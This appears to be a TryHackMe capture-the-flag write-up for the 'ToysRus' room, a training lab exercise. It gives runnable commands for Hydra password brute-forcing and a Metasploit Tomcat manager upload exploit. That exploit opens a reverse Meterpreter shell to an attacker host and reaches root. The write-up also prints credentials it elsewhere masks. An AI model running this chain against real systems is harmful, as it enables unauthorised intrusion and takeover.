---

# ToysRus – Task 1 Write-Up (TryHackMe)

## Overview

This room focuses on basic enumeration and exploitation techniques using common penetration testing tools. The objective is to enumerate the target machine, discover credentials, exploit a vulnerable service, and retrieve the root flag.

**Tools used:**

* Nmap
* Gobuster / Dirbuster
* Hydra
* Nikto
* Metasploit

---

## Initial Enumeration

### Nmap Scan

We begin with a full service and version scan to identify open ports and running services.

```bash
nmap -sV -A <TARGET_IP>
```

**Open ports discovered:**

```
17, 22, 24, 80, 179, 465, 1085, 1090, 1234, 1687, 1782, 
2040, 4444, 5959, 7778, 8009, 9220, 23502
```

Port **80 (HTTP)** and **1234** stood out as web services and became the main focus.

---

## Web Enumeration

### Directory Enumeration (Gobuster / Dirbuster)

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Interesting directories found:**

```
/guidelines   (301)
/protected
```

### Findings

* `/guidelines`

  * Contains information revealing the username **bob**
* `/protected`

  * Protected by **Basic Authentication**

---

## Brute Forcing Credentials

### Hydra Attack on `/protected`

Using the discovered username `bob`, we brute-force the password with `rockyou.txt`.

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected -t 4 -f -V
```

**Valid credentials found:**

```
Username: b**
Password: bub****
```

---

## Further Enumeration

### Web Service on Port 1234

Browsing to port **1234** reveals a **Tomcat Manager** interface.

**Service version:**

* Apache Tomcat **7.0.88**

---

## Nikto Scan

Using the credentials found earlier, Nikto is used to scan the Tomcat manager.

```bash
nikto -h http://<TARGET_IP>:1234/manager/html -id b**:bub****
```

### Results

* **Server version:** Apache/2.4.18
* **Apache-Coyote version:** 1.1
* **Number of documents found:** 5

---

## Exploitation with Metasploit

### Tomcat Manager Upload Exploit

We use Metasploit’s authenticated Tomcat Manager exploit to gain remote code execution.

```bash
msfconsole
search tomcat
use exploit/multi/http/tomcat_mgr_upload
```

### Configuration

```bash
set RHOSTS <TARGET_IP>
set RPORT 1234
set HttpUsername bob
set HttpPassword bubbles
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```

### Result

A **Meterpreter session** is successfully opened.

---

## Post-Exploitation

### Shell Access

```bash
meterpreter > pwd
/
meterpreter > cd /root
meterpreter > ls
```

The session is running as:

```
User: root
```

### Flag Retrieval

```bash
meterpreter > cat /root/flag.txt
```

**Root flag:**

```
ff1fc4a81a**********************
```

---

## Conclusion

This room demonstrates a full attack chain:

1. Service enumeration with Nmap
2. Directory discovery with Gobuster
3. Credential brute-forcing using Hydra
4. Web vulnerability scanning with Nikto
5. Remote code execution via Metasploit

It’s an excellent introduction to real-world enumeration and exploitation workflows.

---
